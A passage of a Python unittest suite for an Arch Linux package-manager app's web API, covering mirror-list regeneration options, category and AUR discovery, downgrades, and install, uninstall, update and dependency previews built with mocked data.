        self.assertIn('no mirrors', res['message'])

    # --- mirror regen options (country / protocol / sort, reflector only) --- #
    def _reflector(self):
        """Patch shutil.which so reflector is the active tool."""
        return patch('atlas.view.webview.api.shutil.which',
                     side_effect=lambda b: '/usr/bin/reflector' if b == 'reflector' else None)

    def test_sanitize_mirror_options_defaults(self):
        o = self.api._sanitize_mirror_options(None)
        self.assertEqual({'country': '', 'protocols': ['https'], 'sort': 'rate', 'latest': 20}, o)

    def test_sanitize_mirror_options_whitelists(self):
        o = self.api._sanitize_mirror_options(
            {'country': 'XX', 'protocols': ['ftp', 'rsync', 'https'], 'sort': 'evil', 'latest': 999})
        self.assertEqual('', o['country'])                     # unknown code dropped
        self.assertEqual(['https', 'rsync'], o['protocols'])   # whitelist + canonical order, ftp gone
        self.assertEqual('rate', o['sort'])                    # unknown sort → default
        self.assertEqual(50, o['latest'])                      # clamped to [5, 50]

    def test_sanitize_mirror_options_keeps_valid(self):
        o = self.api._sanitize_mirror_options(
            {'country': 'DE', 'protocols': ['http'], 'sort': 'age', 'latest': 10})
        self.assertEqual({'country': 'DE', 'protocols': ['http'], 'sort': 'age', 'latest': 10}, o)

    def test_sanitize_mirror_options_empty_protocols_default_https(self):
        o = self.api._sanitize_mirror_options({'protocols': []})
        self.assertEqual(['https'], o['protocols'])

    def test_mirror_regen_cmd_reflects_options(self):
        with self._reflector():
            cmd = self.api._mirror_regen_cmd(
                {'country': 'DE', 'protocols': ['https', 'rsync'], 'sort': 'age', 'latest': 15})
        self.assertEqual('reflector', cmd[0])
        self.assertIn('--country', cmd)
        self.assertEqual('DE', cmd[cmd.index('--country') + 1])
        self.assertEqual('https,rsync', cmd[cmd.index('--protocol') + 1])
        self.assertEqual('age', cmd[cmd.index('--sort') + 1])
        self.assertEqual('15', cmd[cmd.index('--latest') + 1])
        self.assertEqual('/etc/pacman.d/mirrorlist', cmd[-1])

    def test_mirror_regen_cmd_no_country_flag_for_auto(self):
        with self._reflector():
            cmd = self.api._mirror_regen_cmd(None)
        self.assertNotIn('--country', cmd)

    def test_get_mirror_status_exposes_options_for_reflector(self):
        with self._reflector(), patch('os.path.isfile', return_value=False):
            data = self.api.get_mirror_status({'country': 'FR'})['data']
        self.assertEqual('reflector', data['tool'])
        self.assertEqual('FR', data['options']['country'])
        self.assertTrue(any(c['code'] == 'FR' for c in data['countries']))
        self.assertIn('rate', data['sorts'])
        self.assertIn('https', data['protocols'])

    def test_get_mirror_status_omits_options_for_rate_mirrors(self):
        with patch('atlas.view.webview.api.shutil.which',
                   side_effect=lambda b: '/usr/bin/rate-mirrors' if b == 'rate-mirrors' else None), \
             patch('os.path.isfile', return_value=False):
            data = self.api.get_mirror_status({'country': 'FR'})['data']
        self.assertEqual('rate-mirrors', data['tool'])
        self.assertNotIn('options', data)
        self.assertNotIn('countries', data)

    def test_preview_mirror_command_builds_for_options(self):
        with self._reflector():
            res = self.api.preview_mirror_command({'country': 'JP', 'sort': 'score'})
        self.assertEqual('ok', res['status'])
        self.assertIn('--country JP', res['command'])
        self.assertIn('--sort score', res['command'])

    def test_preview_mirror_command_none_without_tool(self):
        with patch('atlas.view.webview.api.shutil.which', return_value=None):
            res = self.api.preview_mirror_command(None)
        self.assertEqual('ok', res['status'])
        self.assertIsNone(res['command'])

    def test_regen_mirrorlist_passes_options_into_argv(self):
        with self._reflector(), \
             patch.object(self.api, 'ensure_root_password', return_value='pw'), \
             patch('atlas.view.webview.api.new_root_subprocess') as mock_proc, \
             patch.object(self.api, '_notify'):
            mock_proc.return_value.communicate.return_value = (b'', b'')
            mock_proc.return_value.returncode = 0
            res = self.api.regenerate_mirrorlist({'country': 'SE', 'protocols': ['https', 'http']})
        self.assertEqual('ok', res['status'])
        argv = mock_proc.call_args[0][0]
        self.assertEqual('SE', argv[argv.index('--country') + 1])
        self.assertEqual('https,http', argv[argv.index('--protocol') + 1])


class RichDetailTest(unittest.TestCase):
    """Detail-modal extras: get_screenshots (Flatpak/AppImage) and get_history."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())
        self.pkg = Mock()
        self.pkg.name = 'gimp'
        self.api.pkg_registry = {'flatpak:gimp': self.pkg}

    def test_get_screenshots_returns_urls(self):
        # generator return + a falsy entry that must be filtered out
        self.manager.get_screenshots.return_value = iter(['http://a/1.png', 'http://a/2.png', ''])
        res = self.api.get_screenshots('flatpak:gimp')
        self.assertEqual('ok', res['status'])
        self.assertEqual(['http://a/1.png', 'http://a/2.png'], res['data'])

    def test_get_screenshots_unknown_pkg(self):
        res = self.api.get_screenshots('does:not-exist')
        self.assertEqual('error', res['status'])

    def test_get_history_serializes_and_marks_current(self):
        hist = Mock()
        hist.history = [{'1_version': '2.10', '3_date': datetime(2026, 1, 1, 0, 0)},
                        {'1_version': '2.11'}]
        hist.pkg_status_idx = 1
        self.manager.get_history.return_value = hist
        res = self.api.get_history('flatpak:gimp')
        self.assertEqual('ok', res['status'])
        self.assertEqual(1, res['data']['current_index'])
        self.assertEqual(2, len(res['data']['history']))
        # datetime is made JSON-safe (ISO string) by _json_safe
        self.assertIsInstance(res['data']['history'][0]['3_date'], str)

    def test_get_history_unknown_pkg(self):
        res = self.api.get_history('does:not-exist')
        self.assertEqual('error', res['status'])


class DowngradeTest(unittest.TestCase):
    """Roll back to a previous version (AtlasApi.downgrade)."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())
        self.pkg = Mock()
        self.pkg.name = 'foo'
        self.pkg.get_type.return_value = 'arch_repo'
        self.pkg.gem_name = 'arch'
        self.api.pkg_registry = {'arch_repo:foo': self.pkg}

    @patch('atlas.view.webview.api.record_activity')
    @patch('atlas.view.webview.api.WebviewWatcher')
    def test_downgrade_success(self, mock_watcher_cls, mock_record):
        self.manager.requires_root.return_value = False  # → no password prompt
        self.manager.downgrade.return_value = True
        res = self.api.downgrade('arch_repo:foo')
        self.assertEqual({'status': 'ok', 'success': True}, res)
        self.manager.downgrade.assert_called_once_with(
            self.pkg, root_password=None, handler=mock_watcher_cls.return_value)
        mock_record.assert_called_once_with('downgrade', 'foo', 'arch_repo', True)

    @patch('atlas.view.webview.api.record_activity')
    def test_downgrade_cancelled_without_password(self, _mock_record):
        self.api.acquire_root_password = Mock(return_value=(False, None))
        res = self.api.downgrade('arch_repo:foo')
        self.assertEqual('cancelled', res['status'])
        self.manager.downgrade.assert_not_called()

    def test_downgrade_unknown_pkg(self):
        res = self.api.downgrade('does:not-exist')
        self.assertEqual('error', res['status'])


class BrowseCategoryTest(unittest.TestCase):
    """Browse-by-category discovery view (get_categories / get_category_packages)."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

        # name -> raw category labels, mirroring atlas-files/arch/categories.txt
        self.cat_map = {
            '0ad': ['Game'],
            'dolphin-emu': ['Emulator'],     # also a Games bucket label
            'firefox': ['Network', 'Browser'],
            'gimp': ['Graphics'],
            'alsa-lib': ['Audio', 'System'],  # Audio & Video + System
            'python-foo': ['Python'],         # Development bucket
        }

        self.arch = Mock()
        self.arch.__module__ = 'atlas.gems.arch.controller'
        self.arch.read_categories.return_value = self.cat_map
        self.arch.list_category_packages.side_effect = self._list_category_packages
        self.manager.managers = [self.arch]

    def _pkg(self, name):
        p = Mock()
        p.name = name
        p.description = ''; p.version = '1'; p.latest_version = '1'; p.installed = False
        p.update = False; p.icon_url = None; p.size = 1; p.categories = self.cat_map.get(name, [])
        p.get_publisher.return_value = ''
        p.get_type.return_value = 'arch_repo'
        for a in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                  'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, a).return_value = False
        return p

    def _list_category_packages(self, names, limit=150):
        return [self._pkg(n) for n in sorted(names)]

    def test_get_categories_buckets_and_counts(self):
        res = self.api.get_categories()
        self.assertEqual('ok', res['status'])
        by_key = {b['key']: b for b in res['data']}

        # Game + Emulator both map into the Games bucket
        self.assertEqual(2, by_key['games']['count'])
        # Network + Browser are the same package (firefox) — distinct-package count is 1
        self.assertEqual(1, by_key['internet']['count'])
        self.assertEqual(1, by_key['graphics']['count'])
        self.assertEqual(1, by_key['multimedia']['count'])   # alsa-lib (Audio)
        self.assertEqual(1, by_key['development']['count'])   # python-foo
        self.assertEqual(1, by_key['system']['count'])        # alsa-lib (System)
        self.assertEqual('Games', by_key['games']['label'])
        # richer cards carry a short description
        self.assertTrue(by_key['games']['description'])
        self.assertIn('emulator', by_key['games']['description'].lower())
        # empty buckets are dropped
        self.assertNotIn('office', by_key)

    def test_get_category_packages_resolves_via_arch_gem(self):
        res = self.api.get_category_packages('games')
        self.assertEqual('ok', res['status'])
        names = sorted(p['name'] for p in res['data'])
        self.assertEqual(['0ad', 'dolphin-emu'], names)
        # the arch gem got exactly the matching names
        called_names = set(self.arch.list_category_packages.call_args[0][0])
        self.assertEqual({'0ad', 'dolphin-emu'}, called_names)

    def test_get_category_packages_unknown_key(self):
        res = self.api.get_category_packages('not-a-bucket')
        self.assertEqual('error', res['status'])

    def test_categories_no_arch_gem(self):
        self.manager.managers = []
        res = self.api.get_categories()
        self.assertEqual('ok', res['status'])
        self.assertEqual([], res['data'])

    def _flatpak_pkg(self, name, app_id):
        p = Mock()
        p.name = name; p.id = app_id
        p.description = ''; p.version = ''; p.latest_version = ''; p.installed = False
        p.update = False; p.icon_url = None; p.size = None; p.categories = []
        p.get_publisher.return_value = ''
        p.get_type.return_value = 'flatpak'
        for a in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                  'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, a).return_value = False
        return p

    def test_get_category_packages_appends_flatpak_when_enabled(self):
        flatpak = Mock()
        flatpak.__module__ = 'atlas.gems.flatpak.controller'
        flatpak.is_enabled.return_value = True
        flatpak.can_work.return_value = (True, None)
        flatpak.list_category_packages.return_value = [
            self._flatpak_pkg('Steam', 'com.valvesoftware.Steam')]
        self.manager.managers = [self.arch, flatpak]

        res = self.api.get_category_packages('games')
        self.assertEqual('ok', res['status'])
        names = sorted(p['name'] for p in res['data'])
        self.assertEqual(['0ad', 'Steam', 'dolphin-emu'], sorted(names))
        # the gem was asked for the bucket's Flathub category, not the raw arch labels
        self.assertEqual('Game', flatpak.list_category_packages.call_args[0][0])

    def test_get_category_packages_skips_disabled_flatpak(self):
        flatpak = Mock()
        flatpak.__module__ = 'atlas.gems.flatpak.controller'
        flatpak.is_enabled.return_value = False
        flatpak.can_work.return_value = (True, None)
        self.manager.managers = [self.arch, flatpak]

        res = self.api.get_category_packages('games')
        self.assertEqual('ok', res['status'])
        flatpak.list_category_packages.assert_not_called()


class AurDiscoveryTest(unittest.TestCase):
    """AUR discovery buckets (get_aur_discovery / get_aur_bucket_packages). The bucket data is a
    precomputed JSON fetched from atlas-files; here it's mocked at the AUR client's http_client."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())
        self.arch = Mock()
        self.arch.__module__ = 'atlas.gems.arch.controller'
        self.manager.managers = [self.arch]
        self.arch.aur_client.http_client.get_json.return_value = self._discovery()

    def _discovery(self):
        return {'buckets': {
            'popular': [{'Name': 'yay'}, {'Name': 'paru'}],
            'recently_updated': [{'Name': 'foo-bin'}],
            'vcs': [],   # empty → omitted from the landing
            'bin': [],
        }}

    def _pkg(self, name):
        p = Mock()
        p.name = name
        p.description = ''; p.version = '1'; p.latest_version = '1'; p.installed = False
        p.update = False; p.icon_url = None; p.size = None; p.categories = []
        p.get_publisher.return_value = ''
        p.get_type.return_value = 'aur'
        for a in ('can_be_run', 'can_be_downgraded', 'has_info', 'has_history',
                  'is_update_ignored', 'supports_ignored_updates'):
            getattr(p, a).return_value = False
        return p

    def test_lists_only_nonempty_buckets(self):
        res = self.api.get_aur_discovery()
        self.assertEqual('ok', res['status'])
        self.assertEqual(['popular', 'recently_updated'], [b['key'] for b in res['data']])
        self.assertEqual(2, res['data'][0]['count'])
        self.assertEqual('Popular', res['data'][0]['label'])

    def test_empty_without_aur_client(self):
        self.arch.aur_client = None
        self.assertEqual([], self.api.get_aur_discovery()['data'])

    def test_empty_when_no_arch_gem(self):
        self.manager.managers = []
        self.assertEqual([], self.api.get_aur_discovery()['data'])

    def test_fetch_is_cached(self):
        self.api.get_aur_discovery()
        self.api.get_aur_discovery()
        self.assertEqual(1, self.arch.aur_client.http_client.get_json.call_count)

    def test_bucket_packages_mapped_via_gem(self):
        self.arch.list_aur_packages.side_effect = lambda entries: [self._pkg(e['Name']) for e in entries]
        res = self.api.get_aur_bucket_packages('popular')
        self.assertEqual('ok', res['status'])
        self.assertEqual(['yay', 'paru'], [p['name'] for p in res['data']])
        self.arch.list_aur_packages.assert_called_once()

    def test_bucket_unknown_key_errors(self):
        self.assertEqual('error', self.api.get_aur_bucket_packages('nope')['status'])

    def test_fails_open_when_fetch_raises(self):
        self.arch.aur_client.http_client.get_json.side_effect = RuntimeError('offline')
        res = self.api.get_aur_discovery()
        self.assertEqual('ok', res['status'])
        self.assertEqual([], res['data'])


class InstallPreviewTest(unittest.TestCase):
    """get_install_preview: per-source pre-flight payload, fail-open per field."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name='pkg', ptype='arch_repo', repository=None, app_id=None,
             installed=False, maintainer=None, version='1.0', download_size=None, size=None):
        p = Mock()
        p.name = name
        p.get_type.return_value = ptype
        p.gem_name = 'arch'
        p.repository = repository
        p.id = app_id
        p.installed = installed
        p.maintainer = maintainer
        p.version = version
        p.latest_version = version
        p.download_size = download_size
        p.size = size
        return p

    def test_arch_repo_payload(self):
        pkg = self._pkg(name='vim', ptype='arch_repo', repository='extra')
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.map_updates_data',
                   return_value={'vim': {'v': '9.1', 'ds': 1500000, 's': 5000000, 'd': {'glibc', 'gpm'}}}), \
             patch('atlas.gems.arch.pacman.map_optional_deps',
                   return_value={'vim': {'python': 'scripting support'}}):
            res = self.api.get_install_preview('arch_repo:vim')

        self.assertEqual('ok', res['status'])
        d = res['data']
        self.assertEqual('vim', d['name'])
        self.assertEqual('Arch · extra', d['source_label'])
        self.assertEqual('9.1', d['version'])
        self.assertEqual({'download': 1500000, 'installed': 5000000}, d['sizes'])
        self.assertEqual(['glibc', 'gpm'], d['deps']['direct'])
        self.assertEqual([{'name': 'python', 'detail': 'scripting support'}], d['deps']['optional'])

    def test_aur_payload_warns_community_and_no_size(self):
        pkg = self._pkg(name='yay', ptype='aur', repository='aur', installed=True, maintainer='alice')
        self.api._get_pkg = Mock(return_value=pkg)
        arch_man = Mock()
        arch_man.aur_client.get_info.return_value = [{
            'Version': '12.1', 'Maintainer': 'bob', 'Depends': ['go', 'git'],
            'MakeDepends': ['gcc'], 'OutOfDate': 1700000000}]
        self.api._manager_by_gem = Mock(return_value=arch_man)

        d = self.api.get_install_preview('aur:yay')['data']
        self.assertEqual('AUR', d['source_label'])
        self.assertIsNone(d['sizes'])  # built from source
        self.assertEqual(['git', 'go'], d['deps']['direct'])
        titles = {w['title'] for w in d['warnings']}
        self.assertIn('Maintainer changed', titles)       # alice -> bob, installed + baseline
        self.assertIn('Flagged out of date', titles)
        self.assertIn('Community-maintained (AUR)', titles)

    def test_flatpak_payload_surfaces_permissions_and_safety(self):
        pkg = self._pkg(name='Dropbox', ptype='flatpak', app_id='com.dropbox.Client',
                        download_size=2000000, size=8000000)
        self.api._get_pkg = Mock(return_value=pkg)
        flatpak_man = Mock()
        flatpak_man.get_flathub_metadata.return_value = {
            'is_free': False, 'verified': False,
            'safety': {'level': 'unsafe'},
            'permissions': [{'title': 'Home folder', 'detail': 'rw', 'level': 'danger'}]}
        self.api._manager_by_gem = Mock(return_value=flatpak_man)

        d = self.api.get_install_preview('flatpak:Dropbox')['data']
        self.assertEqual('Flatpak', d['source_label'])
        self.assertEqual({'download': 2000000, 'installed': 8000000}, d['sizes'])
        self.assertEqual(1, len(d['permissions']))
        titles = {w['title'] for w in d['warnings']}
        self.assertIn('Potentially unsafe permissions', titles)
        self.assertIn('Proprietary', titles)
        self.assertIn('Unverified on Flathub', titles)

    def test_fails_open_when_probe_raises(self):
        pkg = self._pkg(name='vim', ptype='arch_repo', repository='extra')
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.map_updates_data', side_effect=RuntimeError('boom')), \
             patch('atlas.gems.arch.pacman.map_optional_deps', side_effect=RuntimeError('boom')):
            res = self.api.get_install_preview('arch_repo:vim')
        # never blocks: still ok, with a note explaining the missing size
        self.assertEqual('ok', res['status'])
        self.assertIsNone(res['data']['sizes'])
        self.assertTrue(any('unavailable' in n.lower() for n in res['data']['notes']))

    def test_unknown_pkg_id_errors(self):
        self.api._get_pkg = Mock(return_value=None)
        res = self.api.get_install_preview('nope:nope')
        self.assertEqual('error', res['status'])


class DependencySummaryTest(unittest.TestCase):
    """get_dependency_summary: direct / optional / required-by, fail-open per field."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name='pkg', ptype='arch_repo', repository=None, installed=False):
        p = Mock(); p.name = name; p.get_type.return_value = ptype
        p.gem_name = 'arch'; p.repository = repository; p.installed = installed
        self.api._get_pkg = Mock(return_value=p)
        return p

    def test_repo_installed_returns_all_three(self):
        self._pkg(name='vim', ptype='arch_repo', repository='extra', installed=True)
        with patch('atlas.gems.arch.pacman.map_updates_data',
                   return_value={'vim': {'d': {'glibc', 'gpm'}, 'c': {'vi'}, 'p': {'xxd'}}}), \
             patch('atlas.gems.arch.pacman.map_optional_deps',
                   return_value={'vim': {'python': 'scripting'}}), \
             patch('atlas.gems.arch.pacman.map_conflicts_with',
                   return_value={'vim': {'c': {'vi'}, 'r': {'gvim'}}}), \
             patch('atlas.gems.arch.pacman.map_required_by',
                   return_value={'vim': {'neovim-stub'}}), \
             patch('atlas.gems.arch.pacman.get_install_reason', return_value='explicit'):
            d = self.api.get_dependency_summary('arch_repo:vim')['data']
        self.assertEqual(['glibc', 'gpm'], d['direct'])
        self.assertEqual([{'name': 'python', 'detail': 'scripting'}], d['optional'])
        self.assertEqual(['neovim-stub'], d['required_by'])
        self.assertEqual(['vi'], d['conflicts'])
        self.assertEqual(['xxd'], d['provides'])
        self.assertEqual(['gvim'], d['replaces'])
        self.assertEqual('explicit', d['install_reason'])
        self.assertFalse(d['orphan'])  # something requires it

    def test_orphan_when_dependency_and_nothing_requires_it(self):
        self._pkg(name='libfoo', ptype='arch_repo', repository='extra', installed=True)
        with patch('atlas.gems.arch.pacman.map_updates_data', return_value={}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}), \
             patch('atlas.gems.arch.pacman.map_conflicts_with', return_value={}), \
             patch('atlas.gems.arch.pacman.map_required_by', return_value={'libfoo': set()}), \
             patch('atlas.gems.arch.pacman.map_optional_for', return_value={'libfoo': set()}), \
             patch('atlas.gems.arch.pacman.get_install_reason', return_value='dependency'):
            d = self.api.get_dependency_summary('arch_repo:libfoo')['data']
        self.assertEqual('dependency', d['install_reason'])
        self.assertTrue(d['orphan'])  # installed as a dep, now required by nothing (hard or optional)

    def test_not_orphan_when_optional_dependency_of_installed_pkg(self):
        # -Qdt semantics: still listed under "Optional For" → not a true orphan, don't say "remove it".
        self._pkg(name='libfoo', ptype='arch_repo', repository='extra', installed=True)
        with patch('atlas.gems.arch.pacman.map_updates_data', return_value={}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}), \
             patch('atlas.gems.arch.pacman.map_conflicts_with', return_value={}), \
             patch('atlas.gems.arch.pacman.map_required_by', return_value={'libfoo': set()}), \
             patch('atlas.gems.arch.pacman.map_optional_for', return_value={'libfoo': {'someapp'}}), \
             patch('atlas.gems.arch.pacman.get_install_reason', return_value='dependency'):
            d = self.api.get_dependency_summary('arch_repo:libfoo')['data']
        self.assertEqual('dependency', d['install_reason'])
        self.assertFalse(d['orphan'])  # optdepend of an installed package → not a removable orphan

    def test_installed_because_names_explicit_roots(self):
        self._pkg(name='libfoo', ptype='arch_repo', repository='extra', installed=True)
        with patch('atlas.gems.arch.pacman.map_updates_data', return_value={}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}), \
             patch('atlas.gems.arch.pacman.map_conflicts_with', return_value={}), \
             patch('atlas.gems.arch.pacman.map_required_by', return_value={'libfoo': {'app'}}), \
             patch('atlas.gems.arch.pacman.get_install_reason', return_value='dependency'), \
             patch('atlas.gems.arch.pacman.find_explicit_roots', return_value=['app']) as fer:
            d = self.api.get_dependency_summary('arch_repo:libfoo')['data']
        self.assertEqual('dependency', d['install_reason'])
        self.assertFalse(d['orphan'])
        self.assertEqual(['app'], d['installed_because'])
        fer.assert_called_once_with('libfoo')

    def test_installed_because_skipped_for_orphan(self):
        self._pkg(name='libfoo', ptype='arch_repo', repository='extra', installed=True)
        with patch('atlas.gems.arch.pacman.map_updates_data', return_value={}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}), \
             patch('atlas.gems.arch.pacman.map_conflicts_with', return_value={}), \
             patch('atlas.gems.arch.pacman.map_required_by', return_value={'libfoo': set()}), \
             patch('atlas.gems.arch.pacman.map_optional_for', return_value={'libfoo': set()}), \
             patch('atlas.gems.arch.pacman.get_install_reason', return_value='dependency'), \
             patch('atlas.gems.arch.pacman.find_explicit_roots') as fer:
            d = self.api.get_dependency_summary('arch_repo:libfoo')['data']
        self.assertTrue(d['orphan'])
        self.assertEqual([], d['installed_because'])
        fer.assert_not_called()  # no required_by → no roots walk

    def test_not_installed_skips_required_by(self):
        self._pkg(name='vim', ptype='arch_repo', repository='extra', installed=False)
        with patch('atlas.gems.arch.pacman.map_updates_data', return_value={'vim': {'d': {'glibc'}}}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}), \
             patch('atlas.gems.arch.pacman.map_conflicts_with', return_value={}), \
             patch('atlas.gems.arch.pacman.map_required_by') as mrb:
            d = self.api.get_dependency_summary('arch_repo:vim')['data']
        mrb.assert_not_called()  # reverse deps only queried for installed packages
        self.assertEqual([], d['required_by'])

    def test_aur_uses_get_info_and_splits_optdepends(self):
        self._pkg(name='yay', ptype='aur', repository='aur', installed=False)
        arch_man = Mock()
        arch_man.aur_client.get_info.return_value = [{
            'Depends': ['go', 'git'], 'OptDepends': ['sudo: privilege escalation', 'bash'],
            'MakeDepends': ['gcc'], 'CheckDepends': ['perl'],
            'Conflicts': ['paru'], 'Replaces': ['yay-git'], 'Provides': ['aur-helper']}]
        self.api._manager_by_gem = Mock(return_value=arch_man)
        d = self.api.get_dependency_summary('aur:yay')['data']
        self.assertEqual(['git', 'go'], d['direct'])
        self.assertEqual([{'name': 'sudo', 'detail': 'privilege escalation'},
                          {'name': 'bash', 'detail': ''}], d['optional'])
        self.assertEqual(['gcc'], d['makedepends'])
        self.assertEqual(['perl'], d['checkdepends'])
        self.assertEqual(['paru'], d['conflicts'])
        self.assertEqual(['yay-git'], d['replaces'])
        self.assertEqual(['aur-helper'], d['provides'])

    def test_flatpak_returns_note_no_deps(self):
        self._pkg(name='Dropbox', ptype='flatpak')
        d = self.api.get_dependency_summary('flatpak:Dropbox')['data']
        self.assertEqual([], d['direct'])
        self.assertTrue('runtime' in d['note'].lower())

    def test_fails_open_when_probe_raises(self):
        self._pkg(name='vim', ptype='arch_repo', repository='extra', installed=True)
        with patch('atlas.gems.arch.pacman.map_updates_data', side_effect=RuntimeError('boom')), \
             patch('atlas.gems.arch.pacman.map_optional_deps', side_effect=RuntimeError('boom')), \
             patch('atlas.gems.arch.pacman.map_conflicts_with', side_effect=RuntimeError('boom')), \
             patch('atlas.gems.arch.pacman.map_required_by', side_effect=RuntimeError('boom')):
            res = self.api.get_dependency_summary('arch_repo:vim')
        self.assertEqual('ok', res['status'])  # never blocks the modal
        self.assertEqual([], res['data']['direct'])
        self.assertEqual([], res['data']['conflicts'])
        self.assertEqual([], res['data']['replaces'])

    def test_unknown_pkg_id_errors(self):
        self.api._get_pkg = Mock(return_value=None)
        self.assertEqual('error', self.api.get_dependency_summary('nope:nope')['status'])

    def test_package_activity_filters_by_package(self):
        self._pkg(name='vim', ptype='arch_repo', repository='extra', installed=True)
        rows = [
            {'pkg_name': 'vim', 'pkg_type': 'arch_repo', 'action': 'install', 'success': True},
            {'pkg_name': 'vim', 'pkg_type': 'flatpak', 'action': 'install', 'success': True},
            {'pkg_name': 'nano', 'pkg_type': 'arch_repo', 'action': 'install', 'success': True},
        ]
        with patch('atlas.view.webview.api.get_activity_log', return_value=rows):
            d = self.api.get_package_activity('arch_repo:vim')['data']
        self.assertEqual(1, len(d))
        self.assertEqual('vim', d[0]['pkg_name'])

    def test_get_subdeps_returns_direct(self):
        with patch('atlas.gems.arch.pacman.map_updates_data',
                   return_value={'glibc': {'d': {'linux-api-headers', 'tzdata'}}}):
            d = self.api.get_subdeps('glibc')['data']
        self.assertEqual(['linux-api-headers', 'tzdata'], d['direct'])

    def test_get_subdeps_fails_open(self):
        with patch('atlas.gems.arch.pacman.map_updates_data', side_effect=RuntimeError('boom')):
            res = self.api.get_subdeps('glibc')
        self.assertEqual('ok', res['status'])
        self.assertEqual([], res['data']['direct'])

    def test_install_payload_carries_action(self):
        pkg = self._pkg(name='vim', ptype='arch_repo', repository='extra')
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.map_updates_data', return_value={}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}):
            d = self.api.get_install_preview('arch_repo:vim')['data']
        self.assertEqual('install', d['action'])


class UninstallPreviewTest(unittest.TestCase):
    """get_uninstall_preview: reverse-dep danger signal, freed space, fail-open."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name='pkg', ptype='arch_repo', repository='extra', size=None):
        p = Mock()
        p.name = name
        p.get_type.return_value = ptype
        p.gem_name = 'arch'
        p.repository = repository
        p.id = None
        p.version = '1.0'
        p.size = size
        return p

    def test_arch_reverse_deps_become_danger(self):
        pkg = self._pkg(name='glibc', repository='core')
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.get_installed_size', return_value={'glibc': 5000000}), \
             patch('atlas.gems.arch.pacman.map_required_by', return_value={'glibc': {'bash', 'coreutils'}}):
            d = self.api.get_uninstall_preview('arch_repo:glibc')['data']
        self.assertEqual('uninstall', d['action'])
        self.assertEqual({'download': None, 'installed': 5000000}, d['sizes'])
        danger = [w for w in d['warnings'] if w['level'] == 'danger']
        self.assertEqual(1, len(danger))
        self.assertIn('bash', danger[0]['detail'])
        self.assertIn('coreutils', danger[0]['detail'])

    def test_arch_no_reverse_deps_is_reassuring_note(self):
        pkg = self._pkg(name='cowsay', repository='extra')
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.get_installed_size', return_value={'cowsay': 50000}), \
             patch('atlas.gems.arch.pacman.map_required_by', return_value={'cowsay': set()}):
            d = self.api.get_uninstall_preview('arch_repo:cowsay')['data']
        self.assertEqual([], [w for w in d['warnings'] if w['level'] == 'danger'])
        self.assertTrue(any('nothing else' in n.lower() for n in d['notes']))

    def test_flatpak_shows_freed_size(self):
        pkg = self._pkg(name='Dropbox', ptype='flatpak', repository=None, size=8000000)
        self.api._get_pkg = Mock(return_value=pkg)
        d = self.api.get_uninstall_preview('flatpak:Dropbox')['data']
        self.assertEqual({'download': None, 'installed': 8000000}, d['sizes'])

    def test_fails_open_when_required_by_raises(self):
        pkg = self._pkg(name='glibc', repository='core')
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.get_installed_size', return_value={}), \
             patch('atlas.gems.arch.pacman.map_required_by', side_effect=RuntimeError('boom')):
            res = self.api.get_uninstall_preview('arch_repo:glibc')
        self.assertEqual('ok', res['status'])
        # no reverse-dep info → no false "nothing depends on this" reassurance
        self.assertFalse(any('nothing else' in n.lower() for n in res['data']['notes']))

    def test_unknown_pkg_id_errors(self):
        self.api._get_pkg = Mock(return_value=None)
        self.assertEqual('error', self.api.get_uninstall_preview('nope:nope')['status'])


class UpdatePreviewTest(unittest.TestCase):
    """get_update_preview: reuses the install assembler + adds from_version (current → new)."""

    def setUp(self):
        self.manager = Mock()
        self.api = AtlasApi(self.manager, Mock())

    def _pkg(self, name='vim', ptype='arch_repo', repository='extra', version='9.0', latest='9.1'):
        p = Mock()
        p.name = name
        p.get_type.return_value = ptype
        p.gem_name = 'arch'
        p.repository = repository
        p.id = None
        p.installed = True
        p.maintainer = None
        p.version = version
        p.latest_version = latest
        p.download_size = None
        p.size = None
        return p

    def test_repo_update_shows_from_and_to_version(self):
        pkg = self._pkg()
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.map_updates_data',
                   return_value={'vim': {'v': '9.1', 'ds': 1200000, 's': 4000000, 'd': set()}}), \
             patch('atlas.gems.arch.pacman.map_optional_deps', return_value={}):
            d = self.api.get_update_preview('arch_repo:vim')['data']
        self.assertEqual('update', d['action'])
        self.assertEqual('9.0', d['from_version'])
        self.assertEqual('9.1', d['version'])
        self.assertEqual({'download': 1200000, 'installed': 4000000}, d['sizes'])

    def test_fails_open(self):
        pkg = self._pkg()
        self.api._get_pkg = Mock(return_value=pkg)
        with patch('atlas.gems.arch.pacman.map_updates_data', side_effect=RuntimeError('boom')), \
             patch('atlas.gems.arch.pacman.map_optional_deps', side_effect=RuntimeError('boom')):
            res = self.api.get_update_preview('arch_repo:vim')
        self.assertEqual('ok', res['status'])
        self.assertEqual('update', res['data']['action'])

    def test_unknown_pkg_id_errors(self):
        self.api._get_pkg = Mock(return_value=None)
